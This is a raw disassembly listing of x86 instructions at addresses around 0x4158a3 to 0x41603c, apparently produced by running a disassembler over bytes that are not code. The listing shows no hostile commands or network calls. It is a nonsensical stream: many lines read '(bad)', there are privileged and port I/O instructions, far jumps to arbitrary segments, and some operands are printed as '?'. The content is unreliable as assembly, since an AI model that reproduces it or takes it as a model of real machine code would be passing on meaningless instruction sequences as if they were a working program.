  4158a3:	icebp  
  4158a4:	adc    BYTE PTR [ecx-0x4e396e6a],al
  4158aa:	popa   
  4158ab:	and    BYTE PTR [ebx+0x77ec486b],al
  4158b1:	adc    al,0x38
  4158b3:	imul   edi,ebp,0x3b857d93
  4158b9:	mov    ds:0xa6f3f94b,eax
  4158be:	fisttp WORD PTR [ecx+0x253f34bb]
  4158c4:	jg     0x4158b7
  4158c6:	pop    edx
  4158c7:	iret   
  4158c8:	xchg   BYTE PTR [edi+0x51],al
  4158cb:	clc    
  4158cc:	mov    eax,0x8e4f73b7
  4158d1:	shr    BYTE PTR ds:0xe8fab1bc,1
  4158d7:	(bad)  
  4158d9:	outs   dx,DWORD PTR ds:[esi]
  4158da:	in     al,dx
  4158db:	pop    edx
  4158dc:	daa    
  4158dd:	cmp    dh,BYTE PTR [edx]
  4158df:	adc    bh,ch
  4158e1:	loope  0x4158d4
  4158e3:	lock fisub WORD PTR [ebx+0x40cf254d]
  4158ea:	xchg   ebx,eax
  4158eb:	dec    ebp
  4158ec:	inc    eax
  4158ed:	dec    edx
  4158ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4158ef:	cld    
  4158f0:	cmp    esi,DWORD PTR [ebx]
  4158f2:	inc    ebx
  4158f3:	push   esi
  4158f4:	lock scas eax,DWORD PTR es:[edi]
  4158f6:	push   edx
  4158f7:	nop
  4158f8:	nop
  4158f9:	cmc    
  4158fa:	xlat   BYTE PTR ds:[ebx]
  4158fb:	push   ds
  4158fc:	loope  0x41589b
  4158fe:	mov    esp,0xbb20969
  415903:	push   edx
  415904:	pop    edi
  415905:	enter  0x4b99,0x8e
  415909:	mov    bl,0x94
  41590b:	jmp    0x41590c
  41590d:	in     al,dx
  41590e:	mov    ds,WORD PTR [eax+0x77205317]
  415914:	daa    
  415915:	hlt    
  415916:	inc    ebx
  415917:	jns    0x41589c
  415919:	outs   dx,BYTE PTR ds:[esi]
  41591a:	lds    ebx,FWORD PTR [esi-0x55657805]
  415920:	sub    DWORD PTR [ecx],0x36
  415923:	xchg   esi,eax
  415924:	adc    ah,BYTE PTR gs:[edx-0xb]
  415928:	dec    eax
  415929:	jmp    DWORD PTR [esi]
  41592b:	sahf   
  41592c:	pop    edx
  41592d:	adc    DWORD PTR [esi],edx
  41592f:	pop    ds
  415930:	xchg   BYTE PTR [edx+0x62cce35f],dh
  415936:	pusha  
  415937:	bound  ecx,QWORD PTR [esi-0x37]
  41593a:	dec    esp
  41593b:	rol    BYTE PTR [esi-0x34bc0adf],0xd6
  415942:	lea    esi,[edx+0x2ee3ea84]
  415948:	dec    BYTE PTR [edx-0x72]
  41594b:	cs mov dh,0x47
  41594e:	inc    esi
  41594f:	xor    dl,bl
  415951:	mov    dl,0x55
  415953:	mov    ebx,0x8c11bf86
  415958:	pop    edi
  415959:	and    eax,0x21ea1542
  41595e:	dec    ecx
  41595f:	(bad)  
  415960:	fcmovbe st,st(1)
  415962:	mov    ecx,0x33a27f1
  415967:	pop    ecx
  415968:	push   cs
  415969:	fst    DWORD PTR [ecx+0x11a0a7d3]
  41596f:	jmp    0x9383:0xa15462c9
  415976:	mov    cl,0xea
  415978:	stos   BYTE PTR es:[edi],al
  415979:	cwde   
  41597a:	push   es
  41597b:	mov    esi,0x2f614d6b
  415980:	xchg   ebx,eax
  415981:	ja     0x415917
  415983:	je     0x41593b
  415985:	cmp    edi,esi
  415987:	ss leave 
  415989:	push   ecx
  41598a:	mov    WORD PTR [eax+0x24],?
  41598d:	xor    ecx,DWORD PTR [ebx+edi*2-0x1cfb7158]
  415994:	mov    al,0xf5
  415996:	mov    edx,0xf7e032fb
  41599b:	mov    eax,ds:0x72aa5db4
  4159a0:	inc    ebp
  4159a1:	fiadd  DWORD PTR [ebx-0x2f2148b9]
  4159a7:	lock xchg esp,eax
  4159a9:	mov    eax,ds:0x322b31e3
  4159ae:	mov    ds:0xab1a95eb,eax
  4159b3:	adc    cl,bl
  4159b5:	mov    dl,0xa5
  4159b7:	push   esi
  4159b8:	nop    DWORD PTR [eax+ebp*1-0x1c]
  4159bd:	mov    es,edi
  4159bf:	adc    DWORD PTR [ebx+0x46],ebx
  4159c2:	call   0x96c5059a
  4159c7:	shl    DWORD PTR [esi-0x4967d4b4],0xd5
  4159ce:	push   ds
  4159cf:	rol    DWORD PTR [ecx+0x28],0x7b
  4159d3:	test   eax,0x3b2be8f6
  4159d8:	shl    DWORD PTR [edi],1
  4159da:	pushf  
  4159db:	sar    DWORD PTR [edx-0x70],cl
  4159de:	ins    BYTE PTR es:[edi],dx
  4159df:	xor    dl,BYTE PTR [ebx+edx*1]
  4159e2:	dec    edi
  4159e3:	inc    edi
  4159e4:	je     0x415a34
  4159e6:	and    cl,BYTE PTR [esi-0x52]
  4159e9:	retf   0xa804
  4159ec:	(bad)  
  4159ee:	in     eax,dx
  4159ef:	(bad)  
  4159f1:	icebp  
  4159f2:	pop    es
  4159f3:	std    
  4159f4:	sbb    BYTE PTR ds:0x98d4d191,dl
  4159fa:	jle    0x415a59
  4159fc:	in     al,dx
  4159fd:	jns    0x4159d3
  4159ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a00:	stos   BYTE PTR es:[edi],al
  415a01:	nop
  415a02:	call   0x7030:0xb595867f
  415a09:	inc    esi
  415a0a:	ds (bad) 
  415a0c:	stos   DWORD PTR es:[edi],eax
  415a0d:	ret    0xf1d
  415a10:	xchg   ebp,eax
  415a11:	popw   es
  415a13:	sbb    eax,0xbe50c291
  415a18:	add    dl,dl
  415a1a:	xchg   ebx,eax
  415a1b:	cs mov ch,0x8a
  415a1e:	ret    0x6935
  415a21:	xchg   di,ax
  415a23:	jns    0x415a1f
  415a25:	lds    ebp,FWORD PTR [eax]
  415a27:	into   
  415a28:	xchg   edi,eax
  415a29:	test   al,0x6b
  415a2b:	(bad)  ds:0x20f6ce29
  415a31:	(bad)  
  415a33:	and    eax,ebp
  415a35:	mov    al,ds:0xe570e91d
  415a3a:	dec    ecx
  415a3b:	xchg   ebx,eax
  415a3c:	in     eax,dx
  415a3d:	mov    ah,0x1
  415a3f:	push   edx
  415a40:	dec    ebx
  415a41:	out    0x1d,eax
  415a43:	dec    DWORD PTR [ecx+ecx*1-0x64a23c53]
  415a4a:	mov    ds:0x974ff0d,al
  415a4f:	inc    edx
  415a50:	jl     0x415a20
  415a52:	(bad)  
  415a53:	scas   al,BYTE PTR es:[edi]
  415a54:	cwde   
  415a55:	fmul   st(3),st
  415a57:	sahf   
  415a58:	dec    esp
  415a59:	xchg   ecx,eax
  415a5a:	mov    bl,0xe2
  415a5c:	push   cs
  415a5d:	cmp    ch,ah
  415a5f:	or     BYTE PTR [edx],ch
  415a61:	mov    ecx,0x78a65a9b
  415a66:	test   al,0xff
  415a68:	sub    BYTE PTR [edx-0x3a],0x1c
  415a6c:	mov    eax,0xa7219521
  415a71:	mov    ds:0x4747708c,eax
  415a76:	dec    sp
  415a78:	idiv   BYTE PTR [ecx]
  415a7a:	arpl   WORD PTR [eax],bp
  415a7c:	mov    eax,0xaa6abbe8
  415a81:	cmp    dh,al
  415a83:	dec    ebx
  415a84:	test   BYTE PTR [esi],bh
  415a86:	mov    ebp,0x33e32f8d
  415a8b:	ror    DWORD PTR [ebp+0x729c0284],1
  415a91:	xor    al,BYTE PTR [eax]
  415a93:	jmp    0x415d77
  415a98:	sub    dl,BYTE PTR [eax-0x24]
  415a9b:	mov    esp,0x6eaabc6a
  415aa0:	popa   
  415aa1:	pop    ecx
  415aa2:	xchg   ebp,eax
  415aa3:	aas    
  415aa4:	and    eax,0xb801d4a9
  415aa9:	or     eax,0x7eb9707f
  415aae:	jo     0x415b20
  415ab0:	xlat   BYTE PTR ds:[ebx]
  415ab1:	push   ebp
  415ab2:	and    BYTE PTR [esi],al
  415ab4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ab5:	push   edi
  415ab6:	pop    es
  415ab7:	fsub   st,st(4)
  415ab9:	or     bl,BYTE PTR [ebx]
  415abb:	sbb    eax,0xb86ebf64
  415ac0:	xor    DWORD PTR [ebx-0x34],ebx
  415ac3:	adc    BYTE PTR [edi],cl
  415ac5:	add    cl,BYTE PTR [eax]
  415ac7:	mov    edi,0x98daadfa
  415acc:	and    DWORD PTR [ebx],eax
  415ace:	cs inc ebp
  415ad0:	adc    eax,0x2040fd49
  415ad5:	pop    esi
  415ad6:	mov    eax,0xbb740823
  415adb:	mov    ecx,DWORD PTR [edx+0x2ab572d8]
  415ae1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ae2:	cwde   
  415ae3:	sbb    BYTE PTR [edi-0x56c5da50],dh
  415ae9:	push   ebx
  415aea:	xor    eax,0x5aa2b73c
  415aef:	mov    esi,0x102641f6
  415af4:	sar    DWORD PTR [eax+0x22],cl
  415af7:	(bad)  
  415af9:	pop    ebx
  415afa:	pop    es
  415afb:	call   0x5ffe:0x627078a4
  415b02:	cmp    eax,0x205bd222
  415b07:	sub    eax,0x2331f304
  415b0c:	add    al,0x1f
  415b0e:	lods   al,BYTE PTR ds:[esi]
  415b0f:	sub    DWORD PTR [edi-0x39],edx
  415b12:	stos   DWORD PTR es:[edi],eax
  415b13:	jmp    0xbb3e782e
  415b18:	add    BYTE PTR [eax],ch
  415b1a:	mov    ch,0x4f
  415b1c:	jle    0x415b2b
  415b1e:	rcr    BYTE PTR [ebp-0x12],1
  415b21:	imul   esp,DWORD PTR [esi+0x7cc92684],0x3d45ce11
  415b2b:	mov    edx,0xa118cf2f
  415b30:	dec    BYTE PTR [eax]
  415b32:	jo     0x415ad6
  415b34:	ficom  DWORD PTR [edx+esi*8-0x3800eb8]
  415b3b:	mov    ah,0x16
  415b3d:	dec    esp
  415b3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b3f:	mov    ah,0xe0
  415b41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b42:	out    dx,al
  415b43:	clc    
  415b44:	dec    esi
  415b45:	sbb    BYTE PTR ds:0x290dcb6f,bl
  415b4b:	and    edi,DWORD PTR ds:0x4c0fcac9
  415b51:	add    bh,BYTE PTR [edi+0x7578cdd3]
  415b57:	es xchg esp,eax
  415b59:	ficomp DWORD PTR [eax]
  415b5b:	aad    0xdb
  415b5d:	jo     0x415b71
  415b5f:	cmp    ebx,DWORD PTR [esi-0x3f]
  415b62:	leave  
  415b63:	outs   dx,BYTE PTR ds:[esi]
  415b64:	and    bh,BYTE PTR [edi]
  415b66:	sbb    eax,0xa94d7938
  415b6b:	inc    eax
  415b6c:	inc    ebp
  415b6d:	inc    eax
  415b6e:	bound  esi,QWORD PTR [ebx+0x3b]
  415b71:	sbb    al,0xda
  415b73:	jl     0x415b41
  415b75:	mov    eax,ds:0x96991a66
  415b7a:	or     al,0xdb
  415b7c:	arpl   WORD PTR [esi-0x66],si
  415b7f:	sub    eax,0x46d49341
  415b84:	sbb    ch,BYTE PTR [edi-0x35]
  415b87:	lea    edi,[ecx-0x13]
  415b8a:	sti    
  415b8b:	loop   0x415ba7
  415b8d:	scas   eax,DWORD PTR es:[edi]
  415b8e:	nop
  415b8f:	pop    ds
  415b90:	or     al,0xfd
  415b92:	inc    esi
  415b93:	push   ebx
  415b94:	xchg   ebp,eax
  415b95:	add    bh,bl
  415b97:	mov    bl,0x81
  415b99:	push   esp
  415b9a:	stos   DWORD PTR es:[edi],eax
  415b9b:	mov    al,0xc7
  415b9d:	ins    BYTE PTR es:[edi],dx
  415b9e:	cli    
  415b9f:	neg    DWORD PTR [edx+0x273306b4]
  415ba5:	(bad)  
  415ba6:	mov    eax,0x36cc3c63
  415bab:	mov    ds:0x163395d1,eax
  415bb0:	and    BYTE PTR [ebx-0x22],bh
  415bb3:	xor    al,0x41
  415bb5:	add    dl,BYTE PTR [edi-0x785240e6]
  415bbb:	in     al,0xb1
  415bbd:	inc    ecx
  415bbe:	sub    BYTE PTR [esi+0x2d],dl
  415bc1:	sub    al,0xd2
  415bc3:	ret    0x280a
  415bc6:	mov    cl,0xbe
  415bc8:	pop    ecx
  415bc9:	xor    ch,BYTE PTR [ebp+0x26]
  415bcc:	xor    al,0xbd
  415bce:	mov    DWORD PTR [edi+0xc59187a],eax
  415bd4:	es in  al,dx
  415bd6:	shl    BYTE PTR [ecx],0x75
  415bd9:	dec    ebx
  415bda:	outs   dx,BYTE PTR ds:[esi]
  415bdb:	xor    al,0xde
  415bdd:	daa    
  415bde:	outs   dx,BYTE PTR ds:[esi]
  415bdf:	pop    ds
  415be0:	xchg   ebx,eax
  415be1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415be2:	inc    esp
  415be3:	test   BYTE PTR ds:0x97bab0ff,bl
  415be9:	arpl   di,di
  415beb:	add    BYTE PTR [esi-0x4a],0x6
  415bef:	cmp    bh,cl
  415bf1:	das    
  415bf2:	xchg   ebx,eax
  415bf3:	xchg   edx,eax
  415bf4:	mov    dh,0x31
  415bf7:	shr    DWORD PTR [ebx-0x77],cl
  415bfa:	inc    ebx
  415bfb:	jmp    0xb6d1:0x115a8bd0
  415c02:	not    BYTE PTR [esi+0x3a]
  415c05:	outs   dx,DWORD PTR ds:[esi]
  415c06:	dec    edx
  415c07:	mov    cl,0xf9
  415c09:	int3   
  415c0a:	xchg   esi,eax
  415c0b:	sub    edx,DWORD PTR [ecx-0x11]
  415c0e:	loop   0x415ba3
  415c10:	sbb    edi,eax
  415c12:	adc    eax,0x7adabade
  415c17:	push   ebx
  415c18:	fnstcw WORD PTR [ebp+edx*4+0x423ea9e1]
  415c1f:	test   BYTE PTR [esi-0x73],dl
  415c22:	int3   
  415c23:	arpl   WORD PTR [ebp+0x7a886eab],dx
  415c29:	pusha  
  415c2a:	inc    eax
  415c2b:	sub    al,0x76
  415c2d:	(bad)  
  415c2e:	sti    
  415c2f:	sti    
  415c30:	pushf  
  415c31:	(bad)  
  415c32:	stos   DWORD PTR es:[edi],eax
  415c33:	retf   
  415c34:	mov    esi,0x3c37401e
  415c39:	sbb    al,0xe2
  415c3b:	retf   
  415c3c:	hlt    
  415c3d:	add    esi,ebp
  415c3f:	fmul   QWORD PTR [edi+0x5]
  415c42:	cli    
  415c43:	sbb    bh,dh
  415c45:	rol    BYTE PTR [edx+0x14],cl
  415c48:	enter  0x2b6,0x9f
  415c4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c4d:	(bad)  
  415c4e:	cld    
  415c4f:	add    ah,BYTE PTR [edx+0x54]
  415c52:	inc    ecx
  415c53:	scas   eax,DWORD PTR es:[edi]
  415c54:	cmp    BYTE PTR [eax+0x3a],0x5a
  415c58:	mov    dh,0xa0
  415c5a:	(bad)  
  415c5b:	ficomp DWORD PTR [esi-0x3a]
  415c5e:	xchg   esp,eax
  415c5f:	call   0x8d5ac609
  415c64:	(bad)  
  415c65:	addr16 adc cl,ch
  415c68:	or     BYTE PTR [edi-0xb852a5c],ch
  415c6e:	aas    
  415c6f:	pop    esi
  415c70:	in     eax,dx
  415c71:	push   esi
  415c72:	lahf   
  415c73:	push   esp
  415c74:	jae    0x415cb5
  415c76:	nop
  415c77:	int    0x50
  415c79:	popf   
  415c7a:	pushf  
  415c7b:	lock iret 
  415c7d:	fcom   QWORD PTR [ebx+0x64a253e]
  415c83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c84:	stos   DWORD PTR es:[edi],eax
  415c85:	push   edx
  415c86:	stc    
  415c87:	ret    
  415c88:	or     esi,ecx
  415c8a:	jmp    0x7494:0xbf786b78
  415c91:	les    ecx,FWORD PTR [edx-0x2c]
  415c94:	xchg   esp,eax
  415c95:	fist   DWORD PTR [ebp-0x27]
  415c98:	ror    bh,0x1
  415c9b:	push   ebp
  415c9c:	ret    
  415c9d:	sbb    ch,ah
  415c9f:	es add eax,0x2ccc5f8e
  415ca5:	jle    0x415cf6
  415ca7:	pop    eax
  415ca8:	pmulhuw mm3,mm7
  415cab:	aad    0x85
  415cad:	into   
  415cae:	(bad)  
  415caf:	add    BYTE PTR [edx+0x758a9eb8],bl
  415cb5:	addr16 arpl bp,si
  415cb8:	lea    ebx,[esi-0x556701f1]
  415cbe:	(bad)  
  415cbf:	mov    al,ds:0x43052ff2
  415cc4:	stos   BYTE PTR es:[edi],al
  415cc5:	xchg   ebx,eax
  415cc6:	sbb    al,0x7c
  415cc8:	and    BYTE PTR [esi+0x4e040a41],0xde
  415ccf:	jmp    0xc28e595f
  415cd4:	or     eax,0x6a06c7a0
  415cd9:	push   0x3
  415cdb:	data16 or al,0xed
  415cde:	or     eax,0x134cc8c2
  415ce3:	in     eax,dx
  415ce4:	aaa    
  415ce5:	xor    al,0xe8
  415ce7:	clc    
  415ce8:	cmp    BYTE PTR [esi+eax*1+0xb1ff879],cl
  415cef:	lods   al,BYTE PTR ds:[esi]
  415cf0:	dec    edi
  415cf1:	stc    
  415cf2:	pop    esi
  415cf3:	pop    eax
  415cf4:	inc    esi
  415cf5:	and    eax,0xcb31cd0f
  415cfa:	adc    eax,0x7b114719
  415cff:	mov    ds:0x75daf1cc,al
  415d04:	imul   eax,DWORD PTR [esi+0x4f],0xffffffa0
  415d08:	push   0xffffffb4
  415d0a:	fnstsw WORD PTR [edx]
  415d0c:	iret   
  415d0d:	adc    dl,BYTE PTR [ecx+0x83b98db]
  415d13:	sbb    DWORD PTR [edi-0x7d83d00d],0x80d1408f
  415d1d:	hlt    
  415d1e:	and    eax,0x31359001
  415d23:	push   0x48
  415d25:	fwait
  415d26:	inc    ebp
  415d27:	jne    0x415caa
  415d29:	adc    edi,eax
  415d2b:	and    bh,dh
  415d2d:	xchg   ebp,eax
  415d2e:	mov    ss,WORD PTR [bx+0x557e]
  415d33:	test   ah,dh
  415d35:	xchg   dx,ax
  415d37:	push   eax
  415d38:	(bad)  
  415d3a:	xchg   esp,eax
  415d3b:	leave  
  415d3c:	xchg   ebp,eax
  415d3d:	enter  0x7ffe,0x36
  415d41:	mov    ds:0xadd27148,eax
  415d46:	retf   0x835f
  415d49:	or     DWORD PTR [ebx-0x74],edx
  415d4c:	xor    ebx,DWORD PTR [ecx+0x7175b0b1]
  415d52:	aaa    
  415d53:	das    
  415d54:	inc    ebx
  415d55:	push   cs
  415d56:	mov    ds:0xfd2bac5d,eax
  415d5b:	retf   
  415d5c:	push   esp
  415d5d:	or     BYTE PTR [edx+eiz*4-0x41],bh
  415d61:	add    al,0x26
  415d63:	inc    edx
  415d64:	aas    
  415d65:	mov    edx,0x5acf3a16
  415d6a:	scas   eax,DWORD PTR es:[edi]
  415d6b:	xor    bh,BYTE PTR [esi+0x59]
  415d6e:	xor    esi,DWORD PTR [edi+0x69]
  415d71:	bound  edx,QWORD PTR es:[ecx]
  415d74:	iret   
  415d75:	add    bl,BYTE PTR [ebx-0x74f7aa75]
  415d7b:	jge    0x415d59
  415d7d:	mov    DWORD PTR [edi+edx*4],eax
  415d80:	mov    eax,DWORD PTR [ebp-0x18]
  415d83:	jmp    0x416067
  415d88:	dec    eax
  415d89:	fistp  QWORD PTR [edx+0x75a9712b]
  415d8f:	arpl   bx,ax
  415d91:	pop    ss
  415d92:	jp     0x415d95
  415d94:	sti    
  415d95:	push   0xffffff9e
  415d97:	push   esi
  415d98:	or     DWORD PTR [edx],0x7eb9707f
  415d9e:	jo     0x415e10
  415da0:	and    dl,bl
  415da2:	(bad)  
  415da3:	retf   
  415da4:	pusha  
  415da5:	sar    BYTE PTR [esi-0x5447ca86],1
  415dab:	int    0xe3
  415dad:	xor    ch,BYTE PTR [ecx+0x66]
  415db0:	push   0x74
  415db2:	cdq    
  415db3:	leave  
  415db4:	xor    eax,0xe807ac48
  415db9:	jns    0x415d71
  415dbb:	pop    esi
  415dbc:	fimul  DWORD PTR [ebp+0x5f]
  415dbf:	sbb    al,0xa2
  415dc1:	test   ecx,0x7e11412d
  415dc7:	and    dl,BYTE PTR [ebx-0x59]
  415dca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415dcb:	sti    
  415dcc:	add    BYTE PTR [esi+0xb],dh
  415dcf:	mov    ds:0xc6cea6b9,eax
  415dd4:	out    dx,al
  415dd5:	in     eax,dx
  415dd6:	repz inc edi
  415dd8:	jge    0x415d8c
  415dda:	lea    edi,[ebx+ebp*2-0x3f]
  415dde:	lea    edx,[ecx]
  415de0:	jl     0x415e48
  415de2:	xor    bh,bl
  415de4:	mov    dl,0x37
  415de7:	add    esi,DWORD PTR [edx+0x14]
  415dea:	fwait
  415deb:	retf   
  415dec:	push   ds
  415ded:	sbb    BYTE PTR [edi-0x3d],dh
  415df0:	cmp    DWORD PTR [ebp+0x54],ebx
  415df3:	mov    dl,0xa1
  415df5:	jbe    0x415e58
  415df7:	test   eax,0xe3ead9a5
  415dfc:	or     al,0x71
  415dfe:	dec    esp
  415dff:	nop
  415e00:	xor    ah,BYTE PTR [eax]
  415e02:	rcr    DWORD PTR [ebp-0x4bbf4f6f],0xc6
  415e09:	and    DWORD PTR [ebp-0xdd416e9],esp
  415e0f:	push   0xbb65145b
  415e14:	xchg   esi,eax
  415e15:	(bad)  
  415e16:	les    ebp,FWORD PTR [eax]
  415e18:	push   ds
  415e19:	xor    DWORD PTR [edx-0x7b8932d9],edi
  415e1f:	mov    dh,0x6a
  415e21:	div    DWORD PTR [esi+0x7a0e8714]
  415e27:	lods   al,BYTE PTR ds:[esi]
  415e28:	fs repz add bl,dh
  415e2c:	retf   
  415e2d:	mov    ah,ch
  415e2f:	push   ds
  415e30:	ror    DWORD PTR [edi+0x49],cl
  415e33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e34:	dec    edx
  415e35:	loope  0x415e15
  415e37:	pop    ebp
  415e38:	pop    eax
  415e39:	or     al,0x41
  415e3b:	xor    eax,DWORD PTR [edi-0x2d85d87a]
  415e41:	sbb    ah,dl
  415e43:	fnstsw WORD PTR [eax]
  415e45:	sub    ch,bh
  415e47:	cmp    DWORD PTR [edi+0x366390a8],eax
  415e4d:	int    0x23
  415e4f:	es int 0x7a
  415e52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e53:	inc    ecx
  415e54:	cwde   
  415e55:	(bad)  
  415e56:	mov    ebp,0x6ee3dc88
  415e5b:	fwait
  415e5c:	xor    DWORD PTR [edi],0xdfe22d89
  415e62:	dec    ecx
  415e63:	imul   esi,DWORD PTR [ebx+eiz*4],0xb74b9f57
  415e6a:	popa   
  415e6b:	test   BYTE PTR [ebp+edx*8-0x57fce587],dl
  415e72:	loopne 0x415e1b
  415e74:	ds pop edi
  415e76:	lods   eax,DWORD PTR ds:[esi]
  415e77:	inc    esi
  415e78:	jl     0x415e39
  415e7a:	mov    ds:0xe1649009,eax
  415e7f:	(bad)  [edx+0x5]
  415e82:	push   edi
  415e83:	push   cs
  415e84:	imul   eax,edx,0x6
  415e87:	test   al,0x95
  415e89:	adc    cl,dl
  415e8b:	sbb    esi,DWORD PTR [eax-0x33]
  415e8e:	xchg   ecx,eax
  415e8f:	cwde   
  415e90:	pop    esi
  415e91:	pop    esi
  415e92:	jno    0x415ef1
  415e94:	mov    dl,0xc7
  415e96:	out    dx,eax
  415e97:	sbb    DWORD PTR [esi-0x36],ebp
  415e9a:	iret   
  415e9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e9c:	lods   eax,DWORD PTR ds:[esi]
  415e9d:	xchg   ebp,eax
  415e9e:	xor    DWORD PTR ds:0x2edb360c,0xf497866
  415ea8:	pop    ds
  415ea9:	ror    bh,0x69
  415eac:	add    BYTE PTR [eax],dl
  415eae:	pop    esi
  415eaf:	fs mov bl,0xa4
  415eb2:	dec    ebx
  415eb3:	xor    DWORD PTR ds:0xe9e1723f,esi
  415eb9:	mov    al,0xb9
  415ebb:	pop    es
  415ebc:	push   esp
  415ebd:	lds    ebp,FWORD PTR [edx]
  415ebf:	jle    0x415f31
  415ec1:	jmp    0xc15ee66d
  415ec6:	adc    edi,DWORD PTR [eax]
  415ec8:	arpl   WORD PTR [edx-0x48a290fa],di
  415ece:	test   al,0x46
  415ed0:	cmp    DWORD PTR [edx],eax
  415ed2:	les    esp,FWORD PTR fs:[edx+0xa]
  415ed6:	aam    0xf3
  415ed8:	inc    edi
  415ed9:	mov    al,0x3e
  415edb:	or     cl,0xaa
  415ede:	xor    al,BYTE PTR [esi]
  415ee0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ee1:	jg     0x415f1b
  415ee3:	jae    0x415eae
  415ee5:	xchg   esp,eax
  415ee6:	shl    BYTE PTR es:[ecx+0x6ca05477],0x2a
  415eee:	aaa    
  415eef:	xor    al,0xe8
  415ef1:	fistp  DWORD PTR [ebp-0x66]
  415ef4:	cmp    DWORD PTR [edi-0x286a21f8],0x925fa5c2
  415efe:	neg    DWORD PTR [edx+0x46]
  415f01:	jg     0x415f1b
  415f03:	inc    edi
  415f04:	jecxz  0x415f4e
  415f06:	mov    esi,0x511dbcda
  415f0b:	push   esp
  415f0c:	inc    esi
  415f0d:	ja     0x415f3b
  415f0f:	sbb    cl,BYTE PTR [edx+0xe]
  415f12:	mov    ?,WORD PTR [edi-0x21]
  415f15:	sub    al,BYTE PTR [edx-0x14]
  415f18:	xor    DWORD PTR [edx],ebx
  415f1a:	push   es
  415f1b:	dec    edi
  415f1c:	jge    0x415f06
  415f1e:	cmp    al,0x8c
  415f20:	sub    cl,BYTE PTR [eax+0x5b]
  415f23:	test   al,0x6a
  415f25:	mov    al,BYTE PTR [edi-0x5b6b2386]
  415f2b:	enter  0x53d1,0xb9
  415f2f:	leave  
  415f30:	js     0x415f75
  415f32:	xchg   edi,eax
  415f33:	retf   
  415f34:	pmaxsw mm2,QWORD PTR [ecx+esi*2]
  415f38:	or     al,bh
  415f3a:	push   ds
  415f3b:	mov    bh,0x0
  415f3d:	xchg   esi,eax
  415f3e:	xchg   ecx,eax
  415f3f:	or     eax,0x52928f82
  415f44:	jg     0x415f83
  415f46:	pop    ebx
  415f47:	pop    ebx
  415f48:	cs fwait
  415f4a:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f4c:	addr16 dec ebx
  415f4e:	mov    bh,0x16
  415f50:	fidivr WORD PTR [ebx-0x1b]
  415f53:	jbe    0x415f0a
  415f55:	shl    bl,cl
  415f57:	test   bl,0x48
  415f5a:	mul    ebx
  415f5c:	in     eax,dx
  415f5d:	jge    0x415ee2
  415f5f:	retf   0x881d
  415f62:	outs   dx,BYTE PTR ds:[esi]
  415f63:	push   ss
  415f64:	test   DWORD PTR [ebx],ecx
  415f66:	cdq    
  415f67:	lea    esi,[ebp+0x6b4ddd54]
  415f6d:	cmp    eax,0x9b1fd6b7
  415f72:	retf   0x93fe
  415f75:	mov    ds:0x912ae5d3,al
  415f7a:	out    dx,eax
  415f7b:	icebp  
  415f7c:	jbe    0x415f43
  415f7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f7f:	mul    DWORD PTR [edx-0x2f]
  415f82:	rcl    BYTE PTR [edi-0x2],0xd
  415f86:	push   ds
  415f87:	popa   
  415f88:	fdiv   DWORD PTR [eax+0x29]
  415f8b:	cdq    
  415f8c:	mul    dh
  415f8e:	jae    0x415fcf
  415f90:	daa    
  415f91:	daa    
  415f92:	xchg   ebp,eax
  415f93:	clc    
  415f94:	lahf   
  415f95:	xchg   edx,eax
  415f96:	jb     0x415fb2
  415f98:	outs   dx,BYTE PTR ds:[esi]
  415f99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f9a:	mov    cs,WORD PTR [edx]
  415f9c:	jg     0x415fa8
  415f9e:	call   0x9990:0xe9222768
  415fa5:	mov    ecx,0x6d9b9b6
  415faa:	shl    DWORD PTR [eax+0x67d26667],1
  415fb0:	push   edi
  415fb1:	push   cs
  415fb2:	repnz push es
  415fb4:	loop   0x416028
  415fb6:	add    eax,0xcc48a358
  415fbb:	mov    bh,0xd7
  415fbd:	mov    ebp,0x65b1b16d
  415fc2:	or     bh,BYTE PTR [ebp+0x2a7fcdfa]
  415fc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415fc9:	xor    DWORD PTR [edi+0x1e],0x8b92cf48
  415fd0:	and    edx,DWORD PTR [esi+0x2f2f6273]
  415fd6:	call   0x416d:0x38b544db
  415fdd:	test   eax,0xd93a3cde
  415fe2:	add    DWORD PTR [eax+0x41178a84],esi
  415fe8:	mov    ch,0xd4
  415fea:	das    
  415feb:	aaa    
  415fec:	xchg   BYTE PTR [eax],dl
  415fee:	out    0x12,al
  415ff0:	sub    BYTE PTR [ecx+0x20],0xbe
  415ff4:	jmp    0xd989939f
  415ff9:	repz push ss
  415ffb:	arpl   WORD PTR [esi],si
  415ffd:	(bad)  
  415ffe:	call   0xa91c:0xb0ab4701
  416005:	scas   al,BYTE PTR es:[edi]
  416006:	adc    eax,0xe955e279
  41600b:	xor    eax,0x6c0bd452
  416010:	mov    ds,WORD PTR [esp+ecx*4-0x36dc4eed]
  416017:	aas    
  416018:	fadd   QWORD PTR [edx]
  41601a:	push   edi
  41601b:	mov    bl,0xa3
  41601d:	and    DWORD PTR [esi],esi
  41601f:	aam    0x6a
  416021:	shl    BYTE PTR [edi+0x65fa04c6],cl
  416027:	add    edx,DWORD PTR [edi]
  416029:	mov    WORD PTR [edx-0x3],cs
  41602c:	dec    ebx
  41602d:	and    dh,dl
  41602f:	out    0x80,al
  416031:	sti    
  416032:	pop    esi
  416033:	out    0xa1,eax
  416035:	out    dx,al
  416036:	adc    BYTE PTR [edi],0xea
  416039:	stos   DWORD PTR es:[edi],eax
  41603a:	jecxz  0x416099
  41603c:	cmp    eax,0xd8fa6962
